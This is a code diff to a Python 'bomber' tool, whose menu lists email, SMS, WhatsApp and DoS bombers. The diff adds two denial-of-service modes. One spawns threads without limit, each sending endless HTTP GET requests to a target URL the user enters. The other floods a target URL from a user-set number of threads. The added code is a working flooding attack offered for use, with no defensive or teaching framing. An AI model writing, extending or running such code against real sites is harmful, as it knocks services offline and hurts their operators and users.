@@ -10,6 +10,7 @@ import requests
 import datetime
 import progressbar
 import time
+import threading
 
 from threading import Thread
 from selenium import webdriver
@@ -1412,13 +1413,15 @@ print("Initializing program...\n")
 pb()
 
 print('''
-	╭━━━━━━━━━━━━━━━━━━━━━━━╮
-	┃Choose a bomber:       ┃
-	┃1-Email bomber         ┃
-	┃2-Sms bomber           ┃
-	┃3-WhatsApp bomber      ┃
-	┃4-Dos bomber           ┃          
-	╰━━━━━━━━━━━━━━━━━━━━━━━╯
+	╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+	┃Choose a bomber:                               ┃
+	┃1-Email bomber                                 ┃
+	┃2-Sms bomber                                   ┃
+	┃3-WhatsApp bomber                              ┃
+	┃4-Dos bomber                                   ┃ 
+	┃5-Dos bomber v.2 (Only for powerful computers!)┃
+	┃6-Dos bomber v.3                               ┃
+	╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 	''')
 ans=int(input(">> "))
 
@@ -1430,6 +1433,43 @@ elif ans==3:
 	wbomber()
 elif ans==4:
 	doser()
+elif ans==5:  
+	def dos():
+		tr=input("Please enter the target URL: ")
+		while True:
+			requests.get(tr)
+  
+	while True:
+		threading.Thread(target=dos).start()
+
+elif ans==6:
+	def dos(target):
+	    while True:
+	        try:
+	            res = requests.get(target)
+	            print("Request sent!")
+	        except requests.exceptions.ConnectionError:
+	            print("Connection error!")
+
+	threads = 20
+
+	url = input("Please enter the target URL: ")
+
+	try:
+	    threads = int(input("Threads: "))
+	except ValueError:
+	    exit("Threads count is incorrect!")
+	if threads == 0:
+	    exit("Threads count is incorrect!")
+	if not url.__contains__("http"):
+	    exit("URL doesnt contains http or https!")
+	if not url.__contains__("."):
+	    exit("Invalid domain")
+	for i in range(0, threads):
+	    thr = threading.Thread(target=dos, args=(url,))
+	    thr.start()
+	    print(str(i + 1) + " thread started!")
+
 else:
 	print("ERROR: Invalid value")
 	input()
